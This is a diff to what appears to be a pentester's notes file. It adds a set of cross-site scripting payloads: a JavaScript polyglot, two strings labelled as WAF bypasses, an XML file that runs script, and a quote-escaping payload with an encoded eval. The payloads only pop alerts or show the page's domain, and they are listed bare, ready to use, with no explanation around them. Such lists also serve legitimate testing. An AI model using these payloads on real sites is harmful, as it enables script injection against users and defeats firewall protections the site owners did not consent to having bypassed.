@@ -24,8 +24,21 @@ html injection(Can use match and replace in request body):
 
 
 -------------
-JS polyglots
+XSS:
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+%3c<aa+ONLOAD+href=javasONLOADcript:promptONLOAD(1)%3e --> WAF BYPASS
+<img src onerror=alt=''+document.domain> '  --> WAF Bypass
+
+xss payload --> xss.xml:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns:html="http://w3.org/1999/xhtml">
+<html:script>prompt(document.domain);</html:script>
+</html>
+
+Double quote and single quote bypass:
+<xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
 
 
 ------
